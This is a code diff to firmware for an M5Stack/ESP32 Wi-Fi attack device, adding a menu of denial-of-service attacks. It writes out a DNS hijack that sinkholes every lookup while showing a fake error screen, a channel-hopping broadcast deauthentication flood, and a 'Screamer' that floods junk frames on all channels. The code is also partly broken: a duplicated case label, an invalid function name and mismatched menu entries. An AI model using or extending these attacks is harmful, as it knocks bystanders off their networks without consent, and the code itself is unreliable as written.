@@ -90,6 +90,12 @@ int ssh_port = 22;
 //!!!!!! CHANGE THIS !!!!!
 //!!!!!! CHANGE THIS !!!!!
 
+const char* target_vids = "youtube.com";
+const char* target_stream = "googlevideo.com";
+const char* target_game = "roblox.com";
+IPAddress blackhole(0, 0, 0, 0); 
+
+
 // SSH session and channel
 ssh_session my_ssh_session;
 ssh_channel my_channel;
@@ -135,6 +141,9 @@ const char* menuItems[] = {
     "Delete All Probes",
     "Beacon Spam",
     "Deauther",
+    "Global DNS Block",
+    "Glabal Deauth",
+    "Screamer",
     "Handshake Master",
     "WiFi Raw Sniffing",
     "Sniff Raw Clients",
@@ -1244,7 +1253,16 @@ void executeMenuItem(int index) {
     case 29:
         reverseTCPTunnel();
         break;
-    case 30:
+    case 30: // Replace 15 with the actual index of "Global DNS Block"
+        runTotalBlackout();
+        break;
+    case 31:
+        runFrequencyHopper();
+        break;
+    case 32:
+        run2.4GHzJammer();
+        break;
+    case 32:
         showSettingsMenu();
         break;
 
@@ -8739,4 +8757,105 @@ void handleDataTransfer(WiFiClient &client) {
     Serial.println("Connection to local web server closed.");
   }
   delay(10);
+}
+
+void runTotalBlackout() {
+  M5.Lcd.fillScreen(TFT_BLACK);
+  M5.Lcd.setTextColor(TFT_WHITE);
+  M5.Lcd.setCursor(10, 10);
+  M5.Lcd.println("Blackout of all network traffic...");
+
+  // 1. Start DNS Hijack - The "*" means redirect EVERYTHING to 0.0.0.0
+  dnsServer.start(53, "*", IPAddress(0,0,0,0));
+
+  M5.Lcd.fillScreen(TFT_RED); 
+  M5.Lcd.setTextColor(TFT_BLACK);
+  M5.Lcd.setCursor(10, 10);
+  M5.Lcd.println("--- Sys Rrror ---");
+  M5.Lcd.println("WiFi: DISCONNECTED");
+  M5.Lcd.println("Status: SHUTDOWN");
+
+  while(true) {
+    dnsServer.processNextRequest();
+    M5.update();
+    
+    // Press the big front button to stop the attack and be "nice"
+    if (M5.BtnA.wasPressed()) break; 
+    delay(1);
+  }
+
+  dnsServer.stop();
+  M5.Lcd.fillScreen(TFT_BLACK);
+  drawMenu(); 
+}
+void runFrequencyHopper() {
+  M5.Lcd.fillScreen(TFT_PURPLE);
+  M5.Lcd.setCursor(10, 10);
+  M5.Lcd.println("Frequency Hopper active");
+  M5.Lcd.println("Sweeping Ch 1-14...");
+
+  // The Raw Deauth Packet (Broadcast to everyone)
+  uint8_t deauthPacket[] = {
+    0xC0, 0x00, 0x3A, 0x01,
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Receiver: Broadcast
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Source: Spoofed Router
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // BSSID: Broadcast
+    0x00, 0x00, // Sequence
+    0x01, 0x00  // Reason: Unspecified
+  };
+
+  while(true) {
+    for (int ch = 1; ch <= 14; ch++) {
+      // 1. Jump to the next channel
+      esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
+      
+      // 2. Fire 3 bursts per channel
+      for(int i = 0; i < 3; i++) {
+        esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
+        delay(2); // Tiny delay so the radio can keep up
+      }
+
+      M5.update();
+      if (M5.BtnA.wasPressed()) {
+        esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE); // Reset to Ch 1
+        drawMenu();
+        return;
+      }
+    }
+    delay(10); // Short breath before the next full sweep
+  }
+}
+void Screamer() {
+  M5.Lcd.fillScreen(TFT_RED);
+  M5.Lcd.setTextColor(TFT_YELLOW);
+  M5.Lcd.setCursor(10, 10);
+  M5.Lcd.println("Screamer active");
+  M5.Lcd.println("Blasting noise packets on all channels...");
+
+  // Raw "Noise" Packet (Garbage data to confuse the Wi-Fi chip)
+  uint8_t screamPacket[] = { 
+    0x80, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
+    0xDE, 0xAD, 0xBE, 0xEF, 0xFE, 0xED, 0xFF, 0xFF, 0xFF, 0xFF, 
+    0xFF, 0xFF, 0x00, 0x00, 0x01, 0x02, 0x03, 0x04 
+  };
+
+  while(true) {
+    for (int ch = 1; ch <= 14; ch++) {
+      esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
+      
+      // Blast 10 "trash" packets per channel as fast as the S3 can fire
+      for(int i = 0; i < 10; i++) {
+        esp_wifi_80211_tx(WIFI_IF_AP, screamPacket, sizeof(screamPacket), false);
+      }
+      
+      // Check for button press to stop the madness
+      M5.update();
+      if (M5.BtnA.wasPressed()) {
+        esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
+        drawMenu();
+        return;
+      }
+    }
+    // No delay here. We want 100% CPU usage on the Radio.
+  }
 }
